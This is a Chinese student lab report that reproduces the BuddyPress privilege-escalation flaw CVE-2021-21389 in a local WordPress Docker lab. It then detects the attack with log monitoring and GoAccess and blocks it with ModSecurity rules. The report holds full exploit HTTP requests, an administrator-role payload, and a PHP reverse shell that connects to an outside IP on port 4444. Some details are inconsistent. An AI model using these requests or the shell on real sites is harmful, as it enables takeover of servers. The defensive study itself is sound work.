# 实验报告：WordPress 垂直越权（CVE-2021-21389）漏洞复现

## 一、实验目的
本文旨在详细复现 WordPress 垂直越权漏洞（CVE-2021-21389），通过实验过程深入理解该漏洞的成因、利用方法及其潜在风险，为后续的安全防护提供参考。

## 二、实验环境
1. **操作系统**：Kali Linux
2. **WordPress**：版本 5.0.4（受影响版本）
3. **BuddyPress 插件**：版本 7.2.0（受影响版本）
4. **测试工具**：Burp Suite 等抓包工具

## 三、漏洞简介
BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2.1 之前的 5.0.4 版本的 BuddyPress 中，非特权普通用户可以通过利用 REST API 成员端点中的问题来获得管理员权限。该漏洞已在 BuddyPress 7.2.1 中修复。插件的现有安装应更新到此版本以缓解问题。

## 四、实验步骤

### （一）环境搭建
1. **拉取所需镜像**
   ```bash
   docker pull vulfocus/wordpress_cve-2021-21389:latest
   docker pull vulfocus/thinkphp-cve_2018_1002015:latest
   docker pull vulfocus/samba-cve_2017_7494:latest 
   docker pull c4pr1c3/vulshare_nginx-php-flag:latest
   docker pull vulfocus/apache-cve_2021_41773
   docker pull vulfocus/weblogic-cve_2020_2555
   ```
   ![1747473863077](image/homework/1747473863077.png)
   ![1747473881917](image/homework/1747473881917.png)
   ![1747473893030](image/homework/1747473893030.png)
   ![1747473905026](image/homework/1747473905026.png)
   ![1747648013574](image/homework/1747648013574.png)

2. **启动vulfucus环境**
![1747896129453](image/readme/1747896129453.png)
![1747896152092](image/readme/1747896152092.png)

3. **场景搭建&启动场景**
![1748168018019](image/readme/1748168018019.png)

4. **打开浏览器，访问场景地址**
![1747897882478](image/readme/1747897882478.png)

### （二）注册绕过
1. **抓包注册请求**
   - 使用 Burp Suite 抓包。
   ![1747897930858](image/readme/1747897930858.png)
   - 点击`send to repeater`，构造 POST 请求，发送到 `/wp-json/buddypress/v1/signup`。
   - 请求体如下：
     ```json
     {
       "user_login": "attacker1",
       "user_email": "attacker1@163.com",
       "user_name": "attacker1",
       "password": "attacker1"
     }
     ```
    - 最终构造的请求包：
        ```
        POST /wp-json/buddypress/v1/signup HTTP/1.1
        Host: 192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        Content-Type: application/json; charset=UTF-8
        Content-Length: 112

        {"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
        ```

    - 替换 `Host` 为自己的 IP 和端口。
    - 得到回显:
        ```
         HTTP/1.1 200 OK
         Date: Thu, 22 May 2025 03:48:36 GMT
         Server: Apache/2.4.18 (Ubuntu)
         X-Robots-Tag: noindex
         Link: <http://192.168.20.12:10459/wp-json/>; rel="https://api.w.org/"
         X-Content-Type-Options: nosniff
         Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
         Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
         Allow: POST
         Content-Length: 280
         Content-Type: application/json; charset=UTF-8
         [{"id":3,"user_login":"attcker1","registered":"2025-05-22T03:48:36","user_name":"attacker1","activation_key":"aoM0svmO72kVVPbNxYadAKifjIUuYqj8","user_email":"attacker1@163.com","date_sent":"2025-05-22T03:48:36","count_sent":1,"meta":{"field_1":"attacker1","profile_field_ids":1}}]
         ```
2. **提取激活密钥**
   - 发送请求后，服务器会返回一个响应包，其中包含 `activation_key`。
   ![1747885758997](image/homework/1747885758997.png)
   `activation_key` : `aoM0svmO72kVVPbNxYadAKifjIUuYqj8`
   - 提取 `activation_key`，用于后续的激活操作。

3. **构造激活请求**
   - 使用提取的 `activation_key` 构造 PUT 请求，发送到 `/wp-json/buddypress/v1/signup/activate/<activation_key>`。
   ![1747885790638](image/homework/1747885790638.png)
   - 请求体与注册请求相同。
   - 完整请求包：
        ```
        PUT /wp-json/buddypress/v1/signup/activate/aoM0svmO72kVVPbNxYadAKifjIUuYqj8 HTTP/1.1
        Host:192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        Content-Type: application/json; charset=UTF-8
        Content-Length: 112
        {"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
        ```
    - **得到回显:**
        ```
        HTTP/1.1 200 OK
        Date: Thu, 22 May 2025 03:49:29 GMT
        Server: Apache/2.4.18 (Ubuntu)
        X-Robots-Tag: noindex
        Link: <http://192.168.20.12:10459/wp-json/>; rel="https://api.w.org/"
        X-Content-Type-Options: nosniff
        Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
        Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
        Content-Length: 280
        Content-Type: application/json; charset=UTF-8
        [{"id":3,"user_login":"attcker1","registered":"2025-05-22T03:48:36","user_name":"attacker1","activation_key":"aoM0svmO72kVVPbNxYadAKifjIUuYqj8","user_email":"attacker1@163.com","date_sent":"2025-05-22T03:48:36","count_sent":1,"meta":{"field_1":"attacker1","profile_field_ids":1}}]
        ```

4. **登录验证**
   - 使用注册的账号 `attacker1` 和密码 `attacker1` 登录。
   
   ![1747885902130](image/homework/1747885902130.png)
   - 登录后，用户将获得普通用户权限，但尚未获得管理员权限。
   ![1747885938881](image/homework/1747885938881.png)
   ![1748069641307](image/readme/1748069641307.png)

### （三）获取管理员权限
1. **创建用户组**
   - 访问 `http://<your_ip>:<your_port>/groups/create/step/group-details/`。
   - 填写组信息并完成创建。
   - 通过创建用户组，用户将被添加到该组中，为后续的权限提升做准备。
    ![1747888798026](image/homework/1747888798026.png)
    ![1747888866380](image/homework/1747888866380.png)
    ![1747888878196](image/homework/1747888878196.png)
    ![1747888898177](image/homework/1747888898177.png)
    ![1747888916532](image/homework/1747888916532.png)
    ![1747888936571](image/homework/1747888936571.png)
2. **抓取关键参数**
   - 点击 `manage`，再点击 `members`，使用抓包工具抓取请求。
   - 提取请求中的 `X-WP-Nonce` 和 `Cookie` 参数。
   ![1747889012605](image/homework/1747889012605.png)
    **cookie:**
        ```
        grafana_session=7cee305b146bf89decccac3eb414687f; grafana_session_expiry=1747723015; zbx_sessionid=060b0abb1800d98452c40e735dbb58fa; wp-settings-time-2=1747822280; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzRZVGcyWlRWakxUa3dZamN0TkRNMFl5MDVaREF4TFdZME5EZ3haVFptTVdNd01TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--a69a8d8efbbef8037dbb261a0526aae27fb6c1b8; metabase.DEVICE=0af33864-c7aa-43fd-89aa-287250f4c715; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ3OTY5MjYzLCJlbWFpbCI6IiJ9.C9VdlIBrcP4xj1g5TzsBWQosumWuAVXLH1S6Lgzk8nI; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8232bb51e9fa6ae4bed9f94b4ce661c2=attcker1%7C1748062618%7CGvjHpcyFfFhCylwuqLNafXmiHwJqmZ5VldxGcUkR0Bz%7Ca6226440d0bde4fe9d4cf14cce8fcf49dd365c9f342c5296f67044f265433248; wp-settings-time-3=1747889821
        ```
        **X-WP-Nonce:** ``cb16f80772``

3. **构造提权请求**
   - 使用提取的 `X-WP-Nonce` 和 `Cookie` 构造 POST 请求，发送到 `/wp-json/buddypress/v1/members/me`。
   - 请求体如下：
     ```json
     {"roles": "administrator"}
     ```
   - 完整请求包：
        ```http
        POST /wp-json/buddypress/v1/members/me HTTP/1.1
        Host:192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        X-WP-Nonce: cb16f80772
        Cookie: grafana_session=7cee305b146bf89decccac3eb414687f; grafana_session_expiry=1747723015; zbx_sessionid=060b0abb1800d98452c40e735dbb58fa; wp-settings-time-2=1747822280; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzRZVGcyWlRWakxUa3dZamN0TkRNMFl5MDVaREF4TFdZME5EZ3haVFptTVdNd01TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--a69a8d8efbbef8037dbb261a0526aae27fb6c1b8; metabase.DEVICE=0af33864-c7aa-43fd-89aa-287250f4c715; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ3OTY5MjYzLCJlbWFpbCI6IiJ9.C9VdlIBrcP4xj1g5TzsBWQosumWuAVXLH1S6Lgzk8nI; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8232bb51e9fa6ae4bed9f94b4ce661c2=attcker1%7C1748062618%7CGvjHpcyFfFhCylwuqLNafXmiHwJqmZ5VldxGcUkR0Bz%7Ca6226440d0bde4fe9d4cf14cce8fcf49dd365c9f342c5296f67044f265433248; wp-settings-time-3=1747889821SS
        Content-Type: application/json; charset=UTF-8
        Content-Length: 28
        {"roles": "administrator"}
        ```
     ![1747890470194](image/homework/1747890470194.png)
     ![1747890494107](image/homework/1747890494107.png)

4. **验证提权结果**
   - 发送请求后，用户角色将被提升为管理员。
   - 再次登录 WordPress 后台，验证是否获得管理员权限，发现 dashboard 页面功能增加。
   ![1747890528150](image/homework/1747890528150.png)

### （四）上传木马，获取 Shell
1. **上传木马文件**
   - 在 WordPress 后台，点击 `Plugins` 模块，选择 `Add New`。
   ![1747890547884](image/homework/1747890547884.png)
   ![1747890578223](image/homework/1747890578223.png)
   - 点击 `Upload Plugin`，上传包含一句话木马的 PHP 文件。
   ![1747890605964](image/homework/1747890605964.png)
   - 木马文件内容如下：
        ```php
        <?php
        $sock = fsockopen("192.168.168.10", 4444);
        $proc = proc_open("bash -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
        ?>
        ```
        ![1747890820999](image/homework/1747890820999.png)
2. **验证木马执行**
   - 上传成功后，访问 `/wp-content/uploads/<year>/<month>/c.php`。
    ![1747890861599](image/homework/1747890861599.png)
    ![1747890872341](image/homework/1747890872341.png)
   **第一种方法 :**
      - 通过 URL 参数 `cmd` 执行系统命令，例如：
         ```
         http://<your_ip>:<your_port>/wp-content/uploads/2025/05/c.php?cmd=id
         ```
      - 如果返回用户 ID 信息，则说明木马执行成功，获得了 Shell。
      ![1747891827132](image/homework/1747891827132.png)
      ![1747891841145](image/homework/1747891841145.png)
      - 由此,我们找到/tmp目录下的flag,将其输入到场景flag中,成功得分
      flag为`flag-{bmh9a8fd407-0aac-4b54-995d-4bb306a739f5}`
      ![1747891890594](image/homework/1747891890594.png)
   **第二种方法 :**
      - 我们也可以用 metasploit 获取反弹 shell
      ![1747893446502](image/homework/1747893446502.png)
      ![1747893462723](image/homework/1747893462723.png)


## 五、漏洞原理分析
1. **注册绕过**
   - BuddyPress 的注册机制存在缺陷，允许攻击者通过直接激活账户绕过邮箱验证。
   - 该机制未对激活请求进行严格的身份验证，导致攻击者可以利用 `activation_key` 直接激活账户。
2. **权限提升**
   - BuddyPress 的 REST API 成员端点 `/wp-json/buddypress/v1/members/me` 未对敏感字段（如 `roles`）进行权限校验。
   - 攻击者可以通过修改 `roles` 字段，将普通用户提升为管理员。
3. **木马上传**
   - WordPress 的插件上传功能未对上传文件的类型进行严格限制，允许上传 PHP 文件。
   - 攻击者可以利用此漏洞上传包含恶意代码的 PHP 文件，从而在服务器上执行任意命令。

---

## PART2 漏洞利用

### 手动检测
1. **wireshark抓包**
   我们可以利用wireshark抓包来查看攻击行为。
   ```bash
   sudo tcpdump -i eth1 -w capture.pcap port 18813
   ```
   ![1747914135600](image/readme/1747914135600.png)
   打开``wireshark``并分析 : 
   ![1747914180373](image/readme/1747914180373.png)
   **此处需要加上分析结果 !**

---

### 自动化检测
1. **监听日志**
   我们可以看到 `/etc/init.d/mysql restart` 和 `/etc/init.d/apache2 restart` 这两个命令，所以我们可以利用这个漏洞来获取管理员权限。
   这说明容器的日志很有可能写入了 `/var/log/apache2/access.log` 文件，所以我们可以实时监听这个文件，并查看注册或权限提升的尝试行为。
   ```bash
   root@3efe65610f5a:/# 
   cat start.sh
   #!/bin/bash
   /etc/init.d/mysql restart
   /etc/init.d/apache2 restart

   /usr/bin/tail -f /dev/null
   ```

   我们的监听python代码如下：
   ```python
   import time
   import re

   def monitor_access_log(log_path):
      print("[*] 正在实时监控日志文件: {}".format(log_path))

      try:
         with open(log_path, 'r') as f:
               f.seek(0, 2)  # 移动到文件末尾，监听新增内容

               while True:
                  line = f.readline()
                  if not line:
                     time.sleep(0.5)
                     continue

                  # 示例攻击行为规则：你可以继续加规则
                  if re.search(r'PUT\s+/wp-json/buddypress/v1/signup/activate/', line):
                     print("[!!!] 权限提升尝试检测到: {}".format(line.strip()))

                  elif re.search(r'POST\s+/wp-json/buddypress/v1/signup', line):
                     print("[!!!] 注册攻击行为检测到: {}".format(line.strip()))

                  elif re.search(r'/wp-admin', line) and 'wp-login.php' not in line:
                     print("[*] 后台访问行为检测到: {}".format(line.strip()))

                  elif re.search(r'union.*select', line, re.IGNORECASE):
                     print("[!!!] SQL注入尝试检测到: {}".format(line.strip()))

      except Exception as e:
         print("[!] 错误: {}".format(e))

   if __name__ == "__main__":
      monitor_access_log("/var/log/apache2/access.log")
   ```
   ![1747911181136](image/readme/1747911181136.png)
   ![1747911640431](image/readme/1747911640431.png)
   可以发现监听到了攻击行为。

---

2. **goaccess 日志分析工具**
GoAccess 是一个开源的实时日志分析工具，专门用于分析 Web 服务器日志文件。它能够快速解析 Apache、Nginx 等常见 Web 服务器生成的日志，并提供直观的可视化统计信息，帮助安全人员和运维人员快速发现异常行为或潜在攻击。
- 为了使用 GoAccess 进行日志分析，首先需要安装它：
   ```bash
   root@3efe65610f5a:/# 
   apt update && apt install goaccess
   ```
- 接下来我们使用 GoAccess 对 `/var/log/apache2/access.log` 文件进行分析：
   ![1747912555913](image/readme/1747912555913.png)
   ```bash
   root@3efe65610f5a:/# 
   goaccess -f /var/log/apache2/access.log \
   -c \
   --log-format='%h %^[%d:%t %^] "%r" %s %b "%R" "%u"' \
   --date-format=%d/%b/%Y \
   --time-format=%H:%M:%S
   ```
   | 参数 | 说明 |
   |------|------|
   | `-f /var/log/apache2/access.log` | 指定要分析的日志文件路径。`access.log` 是 Apache 默认记录访问请求的日志文件。 |
   | `-c` | 进入交互式配置界面，用户可以在其中选择需要启用的模块（如 IP 地理位置查询、是否显示图表等）。 |
   | `--log-format=...` | 自定义日志格式，必须与 `access.log` 的实际格式匹配，否则无法正确解析。 |
   | `--date-format=%d/%b/%Y` | 设置日期格式为日/月/年（例如：10/Apr/2025） |
   | `--time-format=%H:%M:%S` | 设置时间格式为小时:分钟:秒 |


- GoAccess 需要通过 `--log-format` 告知其如何解析日志内容。以下是一个典型的 Apache `access.log` 条目示例：

   ```
   192.168.1.100 - - [10/Apr/2025:14:23:17 +0000] "GET /index.php HTTP/1.1" 200 3456 "-" "Mozilla/5.0"
   ```

   对应的 `--log-format` 解释如下：

   ```
   %h %^[%d:%t %^] "%r" %s %b "%R" "%u"
   ```

   | 格式符号 | 含义 |
   |----------|------|
   | `%h` | 客户端 IP 地址（host） |
   | `%^[` | 忽略左方括号 `[` |
   | `%d` | 日期（day/month/year） |
   | `%t` | 时间（hour:minute:second） |
   | `%r` | 请求行（method + path + protocol） |
   | `%s` | 响应状态码（如 200, 404） |
   | `%b` | 响应体大小（bytes） |
   | `%R` | Referer 头（即请求来源页面） |
   | `%u` | User-Agent（客户端浏览器信息） |

   > ⚠️ 注意：如果你的日志格式不同，比如包含额外字段（如请求耗时、cookie 等），你需要相应地修改 `--log-format` 字符串，否则会导致解析失败。


   执行上述命令后，GoAccess 会进入终端界面并展示以下关键指标：

   1. **总体请求统计**
      - 总请求数、有效请求数、无效请求（如格式错误）数。
      - 成功响应（2xx）、重定向（3xx）、客户端错误（4xx）、服务端错误（5xx）占比。

   2. **访客 IP 统计**
      - 显示每个 IP 的请求次数，可用于识别异常高频访问者（如爬虫或攻击者）。

   3. **请求 URL 排名**
      - 展示最常访问的 URL，有助于识别热门资源或潜在攻击入口（如 `/wp-json/buddypress/v1/signup`）。

   4. **HTTP 状态码分布**
      - 识别大量 404 或 403 请求，可能表示扫描行为或尝试漏洞利用。

   5. **User-Agent 分布**
      - 查看访问者的浏览器类型，识别非正常访问（如脚本或自动化工具发起的请求）。

   6. **时间趋势图**
      - 展示每小时/每天的访问量变化，帮助识别突发流量或 DDoS 攻击。



   在本次实验中，GoAccess 可以用来监控 WordPress 漏洞攻击行为，例如：

   - ✅ **检测注册绕过攻击**：通过查看 `/wp-json/buddypress/v1/signup` 接口的访问频率。
   - ✅ **识别提权尝试**：检查是否有大量对 `/wp-json/buddypress/v1/members/me` 的 POST 请求。
   - ✅ **追踪恶意上传行为**：查找 `/wp-admin/media-new.php` 或 `/wp-content/uploads/` 相关请求。
   ![1747912486912](image/readme/1747912486912.png)

---

3. **suritata**

---

## PART3 漏洞缓解

**打造Web应用防火墙（WAF）来缓解 Wordpress 漏洞**

### 实验目标
搭建并配置 ModSecurity Web 应用防火墙（WAF），以防御 Wordpress 漏洞攻击。通过实验，掌握以下内容：
1. ModSecurity 的安装与配置。
2. OWASP 核心规则集（CRS）的使用。
3. 针对 Wordpress 漏洞的自定义规则配置。
4. 通过反向代理测试 WAF 的拦截效果。
5. 解决实验过程中遇到的常见问题。

---

### 实验环境
- 操作系统：Kali Linux
- 工具：Apache2、ModSecurity、OWASP CRS、Docker、Wireshark
- 漏洞环境：Wordpress 漏洞测试环境（运行在 23509 端口）

---

### 实验流程

#### 1. 安装ModSecurity
ModSecurity 是一个开源的 Web 应用防火墙（WAF）模块，支持 Apache、Nginx 等 Web 服务器。它通过检测和拦截恶意请求来保护 Web 应用程序。

##### 安装Apache和ModSecurity
```bash
sudo apt update
sudo apt install apache2 libapache2-mod-security2
```
- apache2 是 Apache HTTP 服务器。
- libapache2-mod-security2 是 ModSecurity 的 Apache 模块。
![1748183239288](image/readme/1748183239288.png)

##### 配置ModSecurity
1. 备份默认配置文件：
   ```bash
   sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
   ```
   ![1748183212133](image/readme/1748183212133.png)
   - 默认情况下，ModSecurity 提供了一个推荐的配置文件 modsecurity.conf-recommended。
   - 复制该文件为 modsecurity.conf，以便进行自定义配置。
2. 编辑配置文件：
   ```bash
   sudo vim /etc/modsecurity/modsecurity.conf
   ```
   将`SecRuleEngine`设置为`On`：
   ```bash
   SecRuleEngine On
   ```
   SecRuleEngine 控制 ModSecurity 的规则引擎状态,有以下三种状态:
   - Off：完全禁用规则引擎。
   - DetectionOnly：启用规则引擎，但仅用于检测，不会拦截恶意请求。
   - On：启用规则引擎，检测并拦截恶意请求。
   ![1748183252358](image/readme/1748183252358.png)

3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```
   Apache 在启动时会加载 ModSecurity 模块及其配置文件。
   ![1748183263888](image/readme/1748183263888.png)

#### 3. 使用OWASP核心规则集（CRS）
OWASP CRS提供了一套规则，用于防御常见Web攻击。

##### 下载OWASP CRS
```bash
sudo apt install modsecurity-crs
```
OWASP CRS 是一组预定义的规则，覆盖了多种 Web 攻击类型。
![1748183274617](image/readme/1748183274617.png)

##### 配置OWASP CRS
1. 将规则集链接到ModSecurity：
   ```bash
   sudo ln -s /usr/share/modsecurity-crs/ /etc/apache2/modsecurity-crs
   ```
    ![1748183286516](image/readme/1748183286516.png)
   - 创建符号链接是为了让 ModSecurity 能够方便地访问和加载 OWASP CRS 提供的规则文件。
2. 在ModSecurity配置中加载规则集：
   ```bash
   sudo vim /etc/apache2/mods-enabled/security2.conf
   ```
   添加以下内容：
   ```bash
   IncludeOptional /etc/apache2/modsecurity-crs/*.conf
   IncludeOptional /etc/apache2/modsecurity-crs/rules/*.conf
   ```
   这样配置后,IncludeOptional 指令告诉 Apache 加载指定路径下的所有 .conf 文件。加载 /etc/apache2/modsecurity-crs/ 目录下的所有主配置文件。加载该目录下 rules/ 子目录中的所有规则文件
   ![1748183294205](image/readme/1748183294205.png)

3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```
   ModSecurity 会在每次请求时应用这些规则，检测并拦截恶意流量。

#### 4. 自定义 Wordpress 漏洞规则配置
为了防御 Wordpress 漏洞攻击，我们需要添加针对 jndi: 的自定义规则。

##### 添加自定义规则
1. 创建自定义规则文件：
   ```bash
   sudo vim /etc/apache2/modsecurity-crs/rules/REQUEST-900-Wordpress.conf
   ```

2. 添加以下规则：
   ```
   # 拦截尝试修改角色的请求
   SecRule REQUEST_URI "@contains /wp-json/buddypress/v1/members/me" \
      "id:1001,\
      phase:2,\
      block,\
      msg:'BuddyPress 权限提升尝试',\
      chain"
      SecRule REQUEST_METHOD "@streq POST" \
         "chain"
         SecRule REQUEST_BODY "@rx \"roles\"\s*:\s*\"administrator\"" \
               "t:none,t:urlDecode,t:htmlEntityDecode"

   # 拦截异常的激活请求
   SecRule REQUEST_URI "@rx /wp-json/buddypress/v1/signup/activate/[^/]+$" \
      "id:1002,\
      phase:2,\
      block,\
      msg:'可疑的BuddyPress账户激活尝试'"
   ```

---

🔹 第一条规则：拦截尝试修改角色的请求

```apache
SecRule REQUEST_URI "@contains /wp-json/buddypress/v1/members/me" \
   "id:1001,\
   phase:2,\
   block,\
   msg:'BuddyPress 权限提升尝试',\
   chain"
```

| 参数名称 | 值/表达式 | 说明 |
|----------|------------|------|
| `SecRule` | - | 定义一条 ModSecurity 规则 |
| `REQUEST_URI` | `@contains /wp-json/buddypress/v1/members/me` | 匹配请求 URI 中是否包含 `/wp-json/buddypress/v1/members/me` 路径 |
| `id` | `1001` | 规则唯一标识符，便于日志追踪和管理 |
| `phase` | `2` | 指定在请求处理阶段 2（请求头和请求体已解析）执行此规则 |
| `block` | - | 如果匹配成功，则阻止请求并返回 403 Forbidden |
| `msg` | `'BuddyPress 权限提升尝试'` | 当规则触发时记录的日志信息 |
| `chain` | - | 表示该规则与下一条规则形成“链式”匹配关系，必须同时满足所有条件才会触发动作 |

```apache
SecRule REQUEST_METHOD "@streq POST" \
   "chain"
```

| 参数名称 | 值/表达式 | 说明 |
|----------|------------|------|
| `SecRule` | - | 定义一条 ModSecurity 规则 |
| `REQUEST_METHOD` | `@streq POST` | 精确匹配请求方法是否为 `POST` |
| `chain` | - | 继续链式匹配，表示当前规则是前一条规则的延续 |

---
🔸 第二条规则：检测请求体中是否包含 `"roles": "administrator"`

```apache
SecRule REQUEST_BODY "@rx \"roles\"\s*:\s*\"administrator\"" \
      "t:none,t:urlDecode,t:htmlEntityDecode"
```

| 参数名称 | 值/表达式 | 说明 |
|----------|------------|------|
| `SecRule` | - | 定义一条 ModSecurity 规则 |
| `REQUEST_BODY` | `@rx \"roles\"\s*:\s*\"administrator\""` | 使用正则表达式匹配请求体中的 JSON 字段 `"roles": "administrator"` |
| `t:none` | - | 不进行任何转换，保留原始数据 |
| `t:urlDecode` | - | 对请求体进行 URL 解码，防止攻击者通过编码绕过检测 |
| `t:htmlEntityDecode` | - | 对请求体进行 HTML 实体解码，进一步清洗数据以增强检测准确性 |

**✅ 总结** 

这些规则共同构成了一个完整的防御逻辑，用于检测试图通过 BuddyPress REST API 提权的操作：

1. **第一步**：检测请求是否访问了 `/wp-json/buddypress/v1/members/me` 接口。
2. **第二步**：确认请求方法是否为 `POST`。
3. **第三步**：解析请求体内容，判断是否包含 `"roles": "administrator"`。

如果全部条件都满足，ModSecurity 将阻断请求，并记录日志。这种方式可以有效防御 CVE-2021-21389 漏洞利用行为。

3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```

---

#### 5. 监控和日志分析
启用ModSecurity的日志功能，记录所有拦截的请求，便于后续分析。

##### 配置日志

1. 编辑ModSecurity配置文件：
   ```bash
   sudo vim /etc/modsecurity/modsecurity.conf
   ```

2. 确保日志路径正确：
   ```bash
   SecAuditLog /var/log/apache2/modsec_audit.log
   ```
   - SecAuditLog 指令用于指定 ModSecurity 审计日志的存储路径。
   - /var/log/apache2/modsec_audit.log 是默认的日志文件路径，记录所有拦截的请求及其详细信息。
3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```


#### 6. **配置 Apache2 监听 `81` 端口**
编辑 Apache 的配置文件：
```bash
sudo vim /etc/apache2/ports.conf
```
将 `Listen 80` 改为 `Listen 81`。

编辑虚拟主机配置文件：
```bash
sudo vim /etc/apache2/sites-available/000-default.conf
```
将 `<VirtualHost *:80>` 改为 `<VirtualHost *:81>`。

重启 Apache：
```bash
sudo systemctl restart apache2
```

---

#### 7. **配置反向代理**
启用 Apache 的反向代理模块：
```bash
sudo a2enmod proxy
sudo a2enmod proxy_http
```
- a2enmod 命令用于启用 Apache 模块。
proxy 和 proxy_http 模块用于实现反向代理功能。
- 编辑虚拟主机配置文件：
```bash
sudo vim /etc/apache2/sites-available/000-default.conf
```
在 `<VirtualHost *:81>` 块中添加以下内容：
```bash
<VirtualHost *:81>
    ProxyPreserveHost On
    ProxyPass / http://127.0.0.1:23509/
    ProxyPassReverse / http://127.0.0.1:23509/
</VirtualHost>
```
![1748183339649](image/readme/1748183339649.png)

重启 Apache：
```bash
sudo systemctl restart apache2
```
- Apache 将开始监听 81 端口，并将所有请求通过反向代理转发到 23509 端口。


- **目前的拓扑图:**
```bash
+-------------------+       +-------------------+       +-------------------+
|      Client       | ----> |     WAF (Apache   | ----> |   Target Server   |
|    (curl 请求)    |       |   + ModSecurity)  |       | (Wordpress 测试环境) |
+-------------------+       +-------------------+       +-------------------+
        |                           |                           |
        | 1. 发送请求到 81        | 2. iptables 重定向到 23509    | 3. 处理请求
        | ------------------------> | ------------------------> |
        |                           |                           |
        |                           | 4. 拦截恶意请求             |
        |                           | (返回 403 Forbidden)       |
        | <------------------------ |                           |
        |                           |                           |
        |                           | 5. 记录日志                |
        |                           | (modsec_audit.log)         |
```

---

#### 8. **测试 WAF 是否拦截恶意请求**
```bash
 curl -X PUT -d '{"user_login": "attacker5", "user_email": "attacker5@163.com", "user_name": "attacker5", "password": "attacker5"}' http://192.168.20.12:81/wp-json/buddypress/v1/signup/activate/2pnXFe3HAC3A5SPWCf5OPbWd3LVO3C
```
- 通过 curl 命令向 81 端口发送一个提权的请求。
- 如果 WAF 配置正确，应该返回 403 Forbidden，表示请求被拦截。
- 如果请求被拦截，ModSecurity 会在日志文件中记录详细的请求信息。
![1747959087953](image/readme/1747959087953.png)
![1747963376713](image/readme/1747963376713.png)

---

### **总结**
- 直接 `curl` `23509` 端口可以测试 wordpress提权 漏洞，但无法测试 WAF 的效果。
- 通过反向代理的方式，可以让请求经过 Apache 和 ModSecurity，从而测试 WAF 是否能够拦截恶意请求。
- 使用 `curl` 向 `81` 端口发送请求，验证 WAF 是否生效。
- 通过以上步骤，我在Kali Linux上搭建一个基础的WAF，缓解wordpress提权漏洞。定期更新规则集和监控日志是确保WAF持续有效的关键。

---

#### **为什么需要经过 Apache？**
1. **WAF 的作用**：WAF（Web 应用防火墙）的目的是检测并拦截恶意请求。如果请求直接到达 wordpress 测试环境，WAF 就无法发挥作用。
2. **测试 WAF 的效果**：你需要验证 WAF 是否能够正确拦截包含提权指令的恶意请求。如果请求不经过 WAF，就无法测试 WAF 的效果。
WAF（ModSecurity）全部设在了 81 端口：Apache 监听 81 端口，并通过 ModSecurity 检测所有到达该端口的请求。

wordpress 测试环境仍然运行在 23509 端口：Apache 会将通过 WAF 检测的合法请求转发到 23509 端口。

#### 为什么 WAF 不直接设在 23509 端口？
端口冲突：一个端口只能被一个进程占用。如果 Apache 监听 23509 端口，wordpress 测试环境就无法再监听该端口。

反向代理的优势：通过反向代理，你可以将 WAF 和 wordpress 测试环境解耦，让它们分别运行在不同的端口上，同时确保所有流量都经过 WAF 检测。

---

### 实验总结
本次实验中，我们成功搭建并配置了 ModSecurity WAF，能够有效拦截wordpress提权漏洞攻击。实验过程中，我们学习了以下内容：
1. ModSecurity 的安装与配置。
2. OWASP CRS 的使用。
3. 针对wordpress提权漏洞的自定义规则配置。
4. 通过反向代理测试 WAF 的拦截效果。
5. 解决实验过程中遇到的常见问题。

实验结果表明，WAF 能够有效防御wordpress提权漏洞攻击，但需要定期更新规则集和监控日志，以确保其持续有效。

---

## **问题分析**

### **当前现象**
1. **`curl` 访问 `81` 端口（Apache）**：
   - 返回 403 Forbidden ，说明 WAF 拦截了请求。
   - 这表明 Apache 配置了 ModSecurity 规则，检测到了某些可疑内容。

2. **`curl` 访问 `8080` 端口（wordpress 测试环境）**：
